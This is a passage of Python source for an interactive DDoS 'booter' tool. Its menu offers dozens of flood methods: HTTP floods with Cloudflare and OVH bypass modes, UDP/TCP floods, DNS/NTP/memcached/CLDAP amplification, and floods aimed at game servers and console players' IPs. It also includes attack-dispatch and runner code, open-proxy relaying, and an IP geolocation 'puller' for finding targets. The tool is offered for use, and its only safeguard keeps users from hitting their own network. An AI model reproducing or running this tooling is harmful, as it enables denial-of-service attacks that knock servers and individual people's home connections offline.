  {C.BLOOD}[63]{C.END} GRPC        {C.ASH}│{C.END} {C.STEEL}gRPC/HTTP2 content-type storm{C.END}
  {C.BLOOD}[64]{C.END} MQTT        {C.ASH}│{C.END} {C.STEEL}MQTT CONNECT packets{C.END}
  {C.BLOOD}[65]{C.END} REDIS       {C.ASH}│{C.END} {C.STEEL}Redis PING/INFO commands{C.END}
  {C.BLOOD}[66]{C.END} MYSQL       {C.ASH}│{C.END} {C.STEEL}MySQL handshake storm{C.END}
  {C.BLOOD}[67]{C.END} SMTP        {C.ASH}│{C.END} {C.STEEL}SMTP EHLO session flood{C.END}
  {C.BLOOD}[68]{C.END} FTP         {C.ASH}│{C.END} {C.STEEL}FTP USER/PASS storm{C.END}
  {C.BLOOD}[69]{C.END} TELNET      {C.ASH}│{C.END} {C.STEEL}Telnet option negotiation{C.END}
  {C.BLOOD}[76]{C.END} MIX-L6      {C.ASH}│{C.END} {C.STEEL}rotate L6 payloads{C.END}

  {C.FIRE1}{C.BOLD}┌─ CONSOLE ENDER · PSN/XBOX/SW ─────────────────────────┐{C.END}
  {C.FIRE1}[73]{C.END} PSN           {C.ASH}│{C.END} {C.STEEL}PlayStation network-shaped sessions{C.END}
  {C.FIRE1}[74]{C.END} XBOX          {C.ASH}│{C.END} {C.STEEL}Xbox Live-shaped sessions{C.END}
  {C.FIRE1}[75]{C.END} SWITCH        {C.ASH}│{C.END} {C.STEEL}Switch network-shaped sessions{C.END}
  {C.FIRE1}[76]{C.END} CONSOLE-TCP   {C.ASH}│{C.END} {C.STEEL}console TCP session flood{C.END}
  {C.FIRE1}[79]{C.END} CONSOLE-UDP   {C.ASH}│{C.END} {C.STEEL}console getinfo-shaped UDP{C.END}

  {C.Y}{C.BOLD}┌─ IP TOOLS · PULLER ───────────────────────────────────┐{C.END}
  {C.Y}[70]{C.END} IP Puller      {C.ASH}│{C.END} {C.STEEL}IP/domain → geo, ISP, city, ports{C.END}
  {C.Y}[71]{C.END} Batch resolve  {C.ASH}│{C.END} {C.STEEL}many hosts → A records{C.END}
  {C.Y}[72]{C.END} Discord ID     {C.ASH}│{C.END} {C.STEEL}snowflake → account create time{C.END}


  {C.FIRE1}{C.BOLD}┌─ RDP / FREE NODE / REMOTE ────────────────────────────┐{C.END}
  {C.FIRE1}[55]{C.END} RDP-TCP      {C.ASH}│{C.END} {C.STEEL}RDP negotiate via proxies/Host node{C.END}
  {C.FIRE1}[56]{C.END} NODE-HTTP    {C.ASH}│{C.END} {C.STEEL}hit free/local node endpoint{C.END}
  {C.FIRE1}[57]{C.END} SSH          {C.ASH}│{C.END} {C.STEEL}SSH banner exchange (proxied){C.END}
  {C.FIRE1}[58]{C.END} TLS          {C.ASH}│{C.END} {C.STEEL}TLS ClientHello-shaped TCP{C.END}
  {C.FIRE1}[59]{C.END} R6-SIEGE     {C.ASH}│{C.END} {C.STEEL}Rainbow Six — enter match id{C.END}
  {C.FIRE1}[80]{C.END} START FREE NODE{C.ASH}│{C.END} {C.STEEL}host free node here — no paid VPS{C.END}
  {C.FIRE1}[81]{C.END} CLEAR NODE   {C.ASH}│{C.END} {C.STEEL}clear saved node/relay{C.END}

  {C.NEON}{C.BOLD}┌─ PROXY BAY ───────────────────────────────────────────┐{C.END}
  {C.NEON}[90]{C.END} Refresh proxies  {C.ASH}│{C.END} {C.STEEL}re-fetch + probe open proxies{C.END}
  {C.NEON}[93]{C.END} Proxy status     {C.ASH}│{C.END} {C.STEEL}pool {C.G}{px:,}{C.STEEL}  live {C.NEON}{live:,}{C.END}
  {C.NEON}[94]{C.END} Validate live    {C.ASH}│{C.END} {C.STEEL}re-probe sample for working nodes{C.END}
  {C.NEON}[95]{C.END} Refresh public IP{C.ASH}│{C.END} {C.STEEL}re-detect WAN address{C.END}

  {C.STEEL}{C.BOLD}┌─ SYSTEMS ─────────────────────────────────────────────┐{C.END}
  {C.G}{C.BOLD}[96] ROUTER SHIELD{C.END} {C.ASH}│{C.END} {C.STEEL}ON=save home router  OFF=no protection{C.END}
  {C.NEON}{C.BOLD}[97] THEME / COLORS{C.END} {C.ASH}│{C.END} {C.STEEL}mrrobot · pink · galaxy · toxic · ocean · more{C.END}
  {C.STEEL}[96b]{C.END} {C.ASH}│{C.END} {C.STEEL}ON=save home router  OFF=no protection{C.END}
  {C.STEEL}[91]{C.END} History          {C.ASH}│{C.END} {C.STEEL}past attacks this session{C.END}
  {C.STEEL}[92]{C.END} Soft area [{soft}{C.STEEL}]  {C.ASH}│{C.END} {C.STEEL}rate caps — keeps home WiFi up{C.END}
  {C.BLOOD}[0]{C.END}  Shut Down

""")

    def run_attack(self, name, fn, *args):
        target = args[0] if args else ""
        # duration heuristic by signature
        duration = 60
        for a in args[1:4]:
            if isinstance(a, int) and 1 <= a <= 86400:
                # prefer middleish values as duration when present
                duration = a
        # better: named by method patterns
        try:
            if name.startswith("UDP") or "UDP" in name:
                duration = int(args[2]) if len(args) > 2 else 60
            elif name.startswith("L6") or name.startswith("R6") or "TCP" in name or name in ("RDP-TCP","VPS-HTTP","SSH","TLS","MINECRAFT","MCBOT","KILLER","SLOWLORIS"):
                # tcp style: target, port, duration, ...
                if len(args) >= 3 and isinstance(args[2], int):
                    duration = args[2]
                elif len(args) >= 2 and isinstance(args[1], int):
                    duration = args[1]
            else:
                # http: target, duration, concurrency
                if len(args) >= 2 and isinstance(args[1], int):
                    duration = args[1]
        except Exception:
            duration = 60

        if not self.safety.is_safe(str(target)):
            print(f"\n{C.R}[!] SAFETY BLOCK — local/private/gateway{C.END}")
            print(f"  {C.ASH}target parsed as: {target!r}{C.END}")
            input(f"{C.D}Enter...{C.END}"); return

        tip, tcity = resolve_target(str(target))
        self.methods.target_label = (tip, tcity)
        print(f"\n{C.FIRE3}[*]{C.END} {C.W}{name}{C.END} → {tip} / {tcity}  ({duration}s)")
        conf = input(f"  {C.G}{C.BOLD}[S]{C.END}{C.G}TART{C.END} attack / {C.R}[C]ancel{C.END}: ").strip().lower()
        if conf not in ("s", "start", "y", "yes", ""):
            print(f"  {C.ASH}cancelled{C.END}")
            input(f"{C.D}Enter...{C.END}"); return
        print(f"  {C.G}▶ STARTED — press Enter anytime in the live view to STOP{C.END}")
        self.methods.running = False
        self.methods.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time(), "method": name}

        def runner():
            try:
                if inspect.iscoroutinefunction(fn):
                    asyncio.run(fn(*args))
                else:
                    fn(*args)
            except Exception as e:
                print(f"  {C.R}[worker error] {e}{C.END}")
            finally:
                self.methods.running = False

        th = threading.Thread(target=runner, daemon=True)
        th.start()
        # wait until worker sets running or produces stats
        for _ in range(60):
            if self.methods.running or self.methods.stats["sent"] > 0:
                break
            time.sleep(0.05)
        live_stats(self.methods, duration)
        self.methods.stop()
        th.join(timeout=5)
        entry = {
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "method": name,
            "target": str(target),
            "sent": self.methods.stats["sent"],
            "ok": self.methods.stats["success"],
            "fail": self.methods.stats["fail"],
        }
        self.history.append(entry)
        print(f"{C.G}[+] done{C.END} sent={entry['sent']:,} ok={entry['ok']:,} fail={entry['fail']:,}")
        input(f"{C.D}Enter...{C.END}")


    def _ask_http(self, name, fn):
        t=input(f"  {C.Y}Target URL/IP:{C.END} ").strip()
        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
        c=int(input(f"  {C.Y}Concurrency [40]:{C.END} ") or 40)
        # use reliable sync engine for all L7 names
        mode = name.lower().split("-")[-1] if "-" in name else name.lower()
        mode_map = {
            "get":"get","post":"post","head":"get","null":"get","cookie":"get","pps":"get",
            "even":"get","bot":"get","stress":"stress","dyn":"get","rhex":"get","stomp":"get",
            "ovh":"get","gsb":"get","dgb":"get","avb":"get","cfb":"get","cfbuam":"get",
            "bypass":"get","apache":"post","xmlrpc":"post","downloader":"get",
        }
        m = mode_map.get(mode, "get")
        self.run_attack(name, self.methods.http_flood_sync, t, d, c, m)

    def _ask_udp(self, name, mode, default_port=80):
        t=input(f"  {C.Y}Target IP:{C.END} ").strip()
        p=int(input(f"  {C.Y}Port [{default_port}]:{C.END} ") or default_port)
        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
        raw_pps = input(f"  {C.Y}PPS [100]:{C.END} ").strip() or "100"
        try:
            pps = int(raw_pps)
        except Exception:
            pps = 100
        if pps < 1:
            pps = 1
        before = pps
        pps = self.safety.cap_pps(pps)
        if self.safety.soft_mode and pps != before:
            print(f"  {C.Y}soft ON clipped {before} → {pps}{C.END}")
        else:
            print(f"  {C.ASH}applied PPS = {pps} (exact){C.END}")
        self.run_attack(name, self.methods.udp_flood, t, p, d, pps, mode)

    def _ask_tcp(self, name, mode, default_port=80):
        t=input(f"  {C.Y}Target IP:{C.END} ").strip()
        p=int(input(f"  {C.Y}Port [{default_port}]:{C.END} ") or default_port)
        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
        c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
        self.run_attack(name, self.methods.tcp_flood, t, p, d, c, mode)


    def _detect_public_ip(self):
        """Fast public IP detect — hard timeout so boot never freezes."""
        import urllib.request
        lan = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.0)
            s.connect(("8.8.8.8", 80))
            lan = s.getsockname()[0]
            s.close()
        except Exception:
            pass

        result = {"pub": None}

        def fetch(url):
            if result["pub"]:
                return
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "LostStar/4.6"})
                with urllib.request.urlopen(req, timeout=2.0) as r:
                    txt = r.read().decode("utf-8", "ignore").strip()
                    if txt and " " not in txt and len(txt) < 46 and result["pub"] is None:
                        result["pub"] = txt.split("\n")[0].strip()
            except Exception:
                return

        urls = (
            "http://api.ipify.org",
            "http://ifconfig.me/ip",
            "http://icanhazip.com",
            "http://checkip.amazonaws.com",
        )
        ths = [threading.Thread(target=fetch, args=(u,), daemon=True) for u in urls]
        for th in ths:
            th.start()
        deadline = time.time() + 3.0
        while time.time() < deadline and not result["pub"]:
            time.sleep(0.05)
        return result["pub"], lan

    def tools_roblox_pull(self):
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ ROBLOX PULLER — public profile (not IP steal){C.END}")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        print(f"  {C.ASH}Roblox does not expose player home IPs via public API.{C.END}")
        q = input(f"  {C.Y}Username or user id:{C.END} ").strip()
        if not q:
            return
        print(f"  {C.ASH}querying Roblox...{C.END}")
        data = roblox_user_lookup(q)
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ ROBLOX REPORT{C.END}")
        print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
        if not data.get("ok"):
            print(f"  {C.R}FAIL{C.END}  {data.get('error')}")
            input(f"\n{C.D}Enter...{C.END}")
            return
        def row(k,v):
            print(f"  {C.STEEL}{k:<14}{C.END} {C.W}{v}{C.END}")
        row("User ID", data.get("id"))
        row("Username", data.get("name"))
        row("Display", data.get("display"))
        row("Created", data.get("created"))
        row("Banned", data.get("banned"))
        row("Presence", data.get("presence"))
        row("Location", data.get("lastLocation") or "-")
        row("Place ID", data.get("placeId") or "-")
        row("Game ID", data.get("gameId") or "-")
        row("Universe", data.get("universeId") or "-")
        row("Bio", data.get("bio") or "-")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        print(f"  {C.ASH}No home IP is available from Roblox public endpoints.{C.END}")
        input(f"\n{C.D}Enter to return...{C.END}")

    def tools_p2p_pull(self):
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ P2P ENDPOINT PULLER{C.END}")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        print(f"  {C.ASH}Paste a peer IP / host / server endpoint (not a gamertag).{C.END}")
        q = input(f"  {C.Y}IP / host:{C.END} ").strip()
        if not q:
            return
        print(f"  {C.ASH}resolving + geo + peer ports...{C.END}")
        data = p2p_endpoint_lookup(q)
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ P2P ENDPOINT REPORT{C.END}")
        print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
        if not data.get("ok"):
            print(f"  {C.R}FAIL{C.END}  {data.get('error')}")
            input(f"\n{C.D}Enter...{C.END}")
            return
        def row(k,v):
            print(f"  {C.STEEL}{k:<14}{C.END} {C.W}{v}{C.END}")
        row("Host", data.get("host"))
        row("IP", data.get("query"))
        row("PTR", data.get("ptr") or "-")
        row("Country", f"{data.get('country','-')} / {data.get('regionName','-')} / {data.get('city','-')}")
        row("ZIP", data.get("zip") or "-")
        row("Coords", f"{data.get('lat','-')}, {data.get('lon','-')}")
        row("ISP", data.get("isp") or "-")
        row("Org", data.get("org") or "-")
        row("ASN", data.get("as") or "-")
        ports = data.get("open_ports") or []
        row("Ports", ", ".join(map(str, ports)) if ports else "none detected")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        print(f"  {C.ASH}{data.get('p2p_note')}{C.END}")
        input(f"\n{C.D}Enter to return...{C.END}")

    def tools_ip_pull(self):
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ IP PULLER — report screen (lookup only, not an attack){C.END}")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        q = input(f"  {C.Y}IP / domain:{C.END} ").strip()
        if not q:
            return
        print(f"\n  {C.ASH}resolving + geo + light port probe...{C.END}")
        data = public_ip_lookup(q)
        clear()
        print(get_banner())
        print(f"  {C.Y}{C.BOLD}▌ IP PULLER REPORT{C.END}")
        print(f"  {C.ASH}════════════════════════════════════════════════════════════{C.END}")
        if not data.get("ok"):
            print(f"  {C.R}FAIL{C.END}  {data.get('error')}")
            print(f"  host={data.get('host')} ip={data.get('query')}")
            input(f"\n{C.D}Enter to return...{C.END}")
            return
        def row(label, val):
            print(f"  {C.STEEL}{label:<14}{C.END} {C.W}{val}{C.END}")
        row("Query", q)
        row("Host", data.get("host"))
        row("IP", data.get("query"))
        row("PTR / RDNS", data.get("ptr") or "-")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        row("Continent", f"{data.get('continent','-')} ({data.get('continentCode','-')})")
        row("Country", f"{data.get('country','-')} [{data.get('countryCode','-')}]")
        row("Region", f"{data.get('regionName','-')} ({data.get('region','-')})")
        row("City", data.get("city") or "-")
        row("District", data.get("district") or "-")
        row("ZIP", data.get("zip") or "-")
        row("Coords", f"{data.get('lat','-')}, {data.get('lon','-')}")
        row("Timezone", f"{data.get('timezone','-')} offset={data.get('offset','-')}")
        row("Currency", data.get("currency") or "-")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        row("ISP", data.get("isp") or "-")
        row("Org", data.get("org") or "-")
        row("ASN", data.get("as") or "-")
        row("AS Name", data.get("asname") or "-")
        row("Mobile", data.get("mobile"))
        row("Proxy/VPN", data.get("proxy"))
        row("Hosting", data.get("hosting"))
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        ports = data.get("open_ports") or []
        if ports:
            print(f"  {C.G}Open ports{C.END}    {', '.join(str(x) for x in ports)}")
        else:
            print(f"  {C.Y}Open ports{C.END}    none detected on common set (or filtered)")
        print(f"  {C.ASH}────────────────────────────────────────────────────────────{C.END}")
        print(f"  {C.ASH}City/ZIP are ISP-level estimates — not a street home address.{C.END}")
        print(f"  {C.ASH}This screen is lookup only. It does not start a flood.{C.END}")
        input(f"\n{C.D}Enter to return to menu...{C.END}")

    def tools_discord_id(self):
        print(f"\n  {C.BOLD}DISCORD SNOWFLAKE DECODE{C.END}")
        print(f"  {C.ASH}Public ID timestamp only — cannot return real name/home from ID alone.{C.END}")
        sid = input(f"  {C.Y}Discord user/message ID:{C.END} ").strip()
        info = discord_snowflake_info(sid)
        if not info.get("ok"):
            print(f"  {C.R}{info.get('error')}{C.END}")
        else:
            print(f"  {C.G}ID{C.END}      {info['id']}")
            print(f"  {C.G}Created{C.END} {info['created']}")
        input(f"{C.D}Enter...{C.END}")

    def tools_batch_resolve(self):
        print(f"\n  {C.BOLD}BATCH RESOLVE{C.END} (domains → A records)")
        raw = input(f"  {C.Y}hosts comma-separated:{C.END} ").strip()
        for part in [x.strip() for x in raw.split(',') if x.strip()]:
            try:
                ip = socket.gethostbyname(part)
                print(f"  {C.G}{part}{C.END} → {ip}")
            except Exception as e:
                print(f"  {C.R}{part}{C.END} → {e}")
        input(f"{C.D}Enter...{C.END}")


    def start_free_host(self):
        """Host a free public-facing node — bind 0.0.0.0, show public IP."""
        import json
        host_ip = "0.0.0.0"
        port = 8088
        try:
            port = int(input(f"  {C.Y}Host node port [8088]:{C.END} ") or 8088)
        except Exception:
            port = 8088
        print(f"  {C.Y}[*] Detecting public IP (max 3s)...{C.END}")
        try:
            pub, lan = self._detect_public_ip()
        except Exception:
            pub, lan = None, None
        print(f"  {C.G}Starting FREE HOST NODE on 0.0.0.0:{port}{C.END}")
        print(f"  {C.ASH}Bound all interfaces · free · no paid VPS{C.END}")
        if pub:
            self.vps_relay = (pub, port)
            print(f"  {C.NEON}PUBLIC IP  → {pub}:{port}{C.END}")
            print(f"  {C.NEON}Share URL  → http://{pub}:{port}/status{C.END}")
        else:
            self.vps_relay = (lan or "127.0.0.1", port)
            print(f"  {C.Y}Public IP not detected — using {self.vps_relay[0]}:{port}{C.END}")
        if lan:
            print(f"  {C.STEEL}LAN IP     → {lan}:{port}{C.END}")
        print(f"  {C.ASH}Router: forward TCP {port} → this PC if friends connect from internet{C.END}")
        stop = {"v": False}

        def serve():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                srv.bind((host_ip, port))
                srv.listen(128)
                srv.settimeout(1.0)
            except Exception as e:
                print(f"  {C.R}Host bind failed: {e}{C.END}")
                return
            print(f"  {C.G}FREE NODE listening 0.0.0.0:{port}{C.END}")
            while not stop["v"]:
                try:
                    c, addr = srv.accept()
                except socket.timeout:
                    continue
                except Exception:
                    break
                try:
                    _ = c.recv(2048)
                    body = json.dumps({
                        "node": "LOSTSTAR-FREE-PUBLIC",
                        "version": VERSION,
                        "ok": True,
                        "public": pub,
                        "lan": lan,
                        "port": port,
                        "peer": addr[0],
                    }).encode()
                    resp = (
                        b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                        b"Access-Control-Allow-Origin: *\r\n"
                        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                        b"Connection: close\r\n\r\n" + body
                    )
                    c.sendall(resp)
                except Exception:
                    pass
                try:
                    c.close()
                except Exception:
                    pass
            try:
                srv.close()
            except Exception:
                pass

        th = threading.Thread(target=serve, daemon=True)
        th.start()
        share = f"{self.vps_relay[0]}:{port}"
        print(f"  {C.G}Node live — [56] NODE-HTTP default target = {share}{C.END}")
        print(f"  {C.STEEL}Others can use your public IP if port {port} is forwarded{C.END}")
        input(f"{C.D}Enter...{C.END}")

    def start(self):
        apply_theme(ACTIVE_THEME[0])
        loading_screen()
        print(f"  {C.Y}[*] Detecting public IP (max 3s)...{C.END}")
        try:
            self.public_ip, self.lan_ip = self._detect_public_ip()
        except Exception:
            self.public_ip, self.lan_ip = None, None
        if self.public_ip:
            self.safety.register_public(self.public_ip)
            print(f"  {C.NEON}Public IP → {self.public_ip}{C.END}")
            print(f"  {C.ASH}WAN locked out of targets (anti-self-hit){C.END}")
        self.header()
        print(f"  {C.FIRE1}{C.BOLD}  {OWNER_MARK}{C.END}")
        print(f"  {C.NEON}  BUILD {VERSION}{C.END}\n")
        try: warm=input(f"  {C.Y}Fetch proxies now? [Y/n]:{C.END} ").strip().lower()
        except EOFError: warm="n"
        if warm not in ("n","no"):
            try: self.pool.fetch()
            except Exception as e: print(f"  {C.Y}[!] {e}{C.END}")
        while True:
            self.header(); self.menu()
            choice=input(f"  {C.ASH}╭─{C.END}{C.FIRE1}{C.BOLD}BLANK DISK{C.END}{C.ASH}─╯{C.END} {C.NEON}›{C.END} ").strip().lower()
            m=self.methods
            if choice.isdigit() and 1 <= int(choice) <= 24:
                names={1:"GET",2:"POST",3:"HEAD",4:"NULL",5:"COOKIE",6:"PPS",7:"EVEN",8:"BOT",9:"STRESS",10:"DYN",11:"RHEX",12:"STOMP",13:"OVH",14:"GSB",15:"DGB",16:"AVB",17:"CFB",18:"CFBUAM",19:"BYPASS",20:"APACHE",21:"XMLRPC",22:"DOWNLOADER",23:"SLOW",24:"KILLER"}
                self._ask_http(names.get(int(choice),"GET"), None)
                continue
            table={
                "1":("GET", m.http_get), "2":("POST", m.http_post), "3":("HEAD", m.http_head),
                "4":("NULL", m.http_null), "5":("COOKIE", m.http_cookie), "6":("PPS", m.http_pps),
                "7":("EVEN", m.http_even), "8":("BOT", m.http_bot), "9":("STRESS", m.http_stress),
                "10":("DYN", m.http_dyn), "11":("RHEX", m.http_rhex), "12":("STOMP", m.http_stomp),
                "13":("OVH", m.http_ovh), "14":("GSB", m.http_gsb), "15":("DGB", m.http_dgb),
                "16":("AVB", m.http_avb), "17":("CFB", m.http_cfb), "18":("CFBUAM", m.http_cfbuam),
                "19":("BYPASS", m.http_bypass), "20":("APACHE", m.http_apache), "21":("XMLRPC", m.http_xmlrpc),
                "22":("DOWNLOADER", m.http_downloader),
            }
            if choice=="0":
                print(f"\n{C.D}Shutting down BLANK DISK.{C.END}\n"); break
            elif choice in table:
                self._ask_http(*table[choice])
            elif choice=="23":
                t=input(f"  {C.Y}Target:{C.END} ").strip(); d=int(input(f"  {C.Y}Duration [120]:{C.END} ") or 120)
                n=int(input(f"  {C.Y}Sockets [200]:{C.END} ") or 200)
                self.run_attack("SLOWLORIS", m.slowloris, t, d, n)
            elif choice=="24":
                t=input(f"  {C.Y}Target:{C.END} ").strip(); d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("KILLER", m.killer, t, d, c)
            elif choice=="25":
                self._ask_http("HTTP2-FLOOD", None)
            elif choice=="26":
                self._ask_http("PATH-RAND", None)
            elif choice=="27":
                self._ask_http("UA-ROTATE", None)
            elif choice=="38":
                self._ask_udp("UDP-STORM", "std")
            elif choice=="39":
                self._ask_udp("UDP-MIX", "ovh")
            elif choice=="30": self._ask_tcp("TCP","connect")

            elif choice=="71":
                raw=input(f"  {C.Y}IPv4 target:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                pps=int(input(f"  {C.Y}PPS [100]:{C.END} ") or 100)
                self.run_attack("IPv4", m.ip_flood, raw, port, d, pps, 4)
            elif choice=="72":
                raw=input(f"  {C.Y}IPv6 target (addr or host):{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                pps=int(input(f"  {C.Y}PPS [100]:{C.END} ") or 100)
                self.run_attack("IPv6", m.ip_flood, raw, port, d, pps, 6)
            elif choice=="73":
                raw=input(f"  {C.Y}Console player/host IP:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [3074]:{C.END} ") or 3074)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("PSN", m.console_flood, raw, port, d, c, "psn")
            elif choice=="74":
                raw=input(f"  {C.Y}Console player/host IP:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [3074]:{C.END} ") or 3074)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("XBOX", m.console_flood, raw, port, d, c, "xbox")
            elif choice=="75":
                raw=input(f"  {C.Y}Console player/host IP:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [1]:{C.END} ") or 1)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("SWITCH", m.console_flood, raw, port, d, c, "switch")
            elif choice=="79":
                self._ask_udp("CONSOLE-UDP","console",3074)
            elif choice=="76":
                raw=input(f"  {C.Y}Console player/host IP:{C.END} ").strip()
                port=int(input(f"  {C.Y}Port [3074]:{C.END} ") or 3074)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("CONSOLE-TCP", m.console_flood, raw, port, d, c, "xbox-live")

            elif choice=="31": self._ask_udp("UDP","std")
            elif choice=="32": self._ask_tcp("SYN-SHAPE","syn_shape")
            elif choice=="33": self._ask_udp("OVH-UDP","ovh")
            elif choice=="34": self._ask_tcp("CPS","cps")
            elif choice=="35": self._ask_tcp("CONNECTION","connection")
            elif choice=="36": self._ask_udp("VSE","vse",27015)
            elif choice=="37": self._ask_udp("TS3","ts3",9987)
            elif choice=="38": self._ask_udp("FIVEM","fivem",30120)
            elif choice=="39": self._ask_udp("FIVEM-TOKEN","fivemtoken",30120)
            elif choice=="40": self._ask_udp("FIVEM-PLAYERS","fivemplayers",30120)
            elif choice=="41":
                raw = input(f"  {C.Y}MC server (IP or domain [.net/.com/:port]):{C.END} ").strip()
                ip, host, port = resolve_mc_target(raw)
                print(f"  {C.ASH}resolved {host} → {ip}:{port}{C.END}")
                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c = int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("MINECRAFT", m.tcp_flood, ip, port, d, c, "minecraft")
            elif choice=="42": self._ask_tcp("MCBOT","mcbot",25565)
            elif choice=="43": self._ask_udp("MCPE","mcpe",19132)
            elif choice=="44": self._ask_udp("RUST","rust",28015)
            elif choice=="45": self._ask_udp("GMOD","gmod",27015)
            elif choice=="46": self._ask_udp("ARK","ark",27015)
            elif choice=="47": self._ask_udp("SAMP","samp",7777)
            elif choice=="48": self._ask_udp("CSGO","csgo",27015)
            elif choice=="49": self._ask_udp("DISCORD","discord",50000)
            elif choice=="50": self._ask_udp("DNS","dns",53)
            elif choice=="51": self._ask_udp("NTP","ntp",123)
            elif choice=="52": self._ask_udp("CHAR","char",19)
            elif choice=="53": self._ask_udp("MEM","mem",11211)
            elif choice=="54": self._ask_udp("CLDAP","cldap",389)
            elif choice=="80":
                self.start_free_host()
            elif choice=="81":
                self.vps_relay=None
                print(f"  {C.Y}Free host node / relay cleared{C.END}")
                input(f"{C.D}Enter...{C.END}")
            elif choice=="55":
                raw = input(f"  {C.Y}RDP host (IP/domain) [port 3389]:{C.END} ").strip()
                host, port = parse_host_port(raw, 3389)
                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c = int(input(f"  {C.Y}Threads [30]:{C.END} ") or 30)
                print(f"  {C.ASH}RDP X.224 → {host}:{port} via proxies if loaded{C.END}")
                self.run_attack("RDP-TCP", m.tcp_flood, host, port, d, c, "rdp")
            elif choice=="56":
                if self.vps_relay:
                    print(f"  {C.NEON}Using saved Host node {self.vps_relay[0]}:{self.vps_relay[1]}{C.END}")
                    host, port = self.vps_relay
                else:
                    raw = input(f"  {C.Y}Free node host [:port] (e.g. 127.0.0.1:8088):{C.END} ").strip() or "127.0.0.1:8088"
                    host, port = parse_host_port(raw, 80)
                    save = input(f"  {C.Y}Save as relay for later? [Y/n]:{C.END} ").strip().lower()
                    if save not in ("n","no"):
                        self.vps_relay=(host, port)
                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c = int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                print(f"  {C.ASH}Hitting free node {host}:{port} (hosted by you — free){C.END}")
                self.run_attack("NODE-HTTP", m.tcp_flood, host, port, d, c, "vps")
            elif choice=="59":
                raw = input(f"  {C.Y}R6 target host/IP:{C.END} ").strip()
                host, port = parse_host_port(raw, 443)
                mid = input(f"  {C.Y}Match ID:{C.END} ").strip()
                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
                c = int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("R6-SIEGE", m.r6_flood, host, port, d, c, mid)
            elif choice=="57": self._ask_tcp("SSH","ssh",22)
            elif choice=="58": self._ask_tcp("TLS","tls",443)
            elif choice=="60":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-SOCKET", m.l6_flood, t, p, d, c, "socket")
            elif choice=="61":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [443]:{C.END} ") or 443)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-HTTP2", m.l6_flood, t, p, d, c, "http2")
            elif choice=="62":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [40]:{C.END} ") or 40)
                self.run_attack("L6-WS", m.l6_flood, t, p, d, c, "ws")
            elif choice=="63":
                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [443]:{C.END} ") or 443)
